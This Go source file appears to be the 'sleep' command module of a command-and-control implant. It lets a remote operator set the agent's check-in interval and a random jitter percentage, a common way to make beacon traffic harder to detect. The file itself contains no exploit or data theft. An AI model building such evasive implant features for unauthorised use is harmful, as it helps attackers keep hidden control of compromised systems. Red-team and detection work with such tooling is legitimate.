package command

import (
	"encoding/json"
	"fmt"
	"log"
	"time"
)

// CommandIDSleep Sleep 命令 ID
const CommandIDSleep uint32 = 5

// SleepInterval 全局 sleep 间隔，供 main.go 使用
var SleepInterval = 5 * time.Second
// JitterPercentage 全局 jitter 百分比 (0-99)，供 main.go 使用
var JitterPercentage = 0 // Default to no jitter

// SleepCommand 实现 sleep 命令
type SleepCommand struct{}

func init() {
	Register(&SleepCommand{})
}

func (c *SleepCommand) ID() uint32 {
	return CommandIDSleep
}

func (c *SleepCommand) Name() string {
	return "sleep"
}

// SleepArgs 定义 sleep 命令的参数结构
type SleepArgs struct {
	Sleep  int32 `json:"sleep"`
	Jitter int32 `json:"jitter"` // Percentage, 0-99
}

func (c *SleepCommand) Execute(task *Task) ([]byte, error) {
	var args SleepArgs

	if len(task.Arguments) == 0 {
		return nil, fmt.Errorf("empty sleep arguments")
	}

	if err := json.Unmarshal(task.Arguments, &args); err != nil {
		// If it's not a JSON object, try to parse it as a single integer (old format)
		var oldSleep int32
		if err := json.Unmarshal(task.Arguments, &oldSleep); err == nil {
			args.Sleep = oldSleep
			args.Jitter = 0 // Default jitter to 0 for old format
		} else {
			return nil, fmt.Errorf("invalid sleep arguments: %v", err)
		}
	}

	// 验证 sleep 范围
	if args.Sleep < 1 || args.Sleep > 3600 {
		return nil, fmt.Errorf("sleep value must be between 1 and 3600 seconds, got %d", args.Sleep)
	}

	// 验证 jitter 范围
	if args.Jitter < 0 || args.Jitter > 99 {
		return nil, fmt.Errorf("jitter value must be between 0 and 99 percent, got %d", args.Jitter)
	}

	SleepInterval = time.Duration(args.Sleep) * time.Second
	JitterPercentage = int(args.Jitter)

	log.Printf("Updated check-in interval to %s with %d%% jitter", SleepInterval, JitterPercentage)
	return []byte(fmt.Sprintf("Sleep interval set to %d seconds with %d%% jitter", args.Sleep, args.Jitter)), nil
}

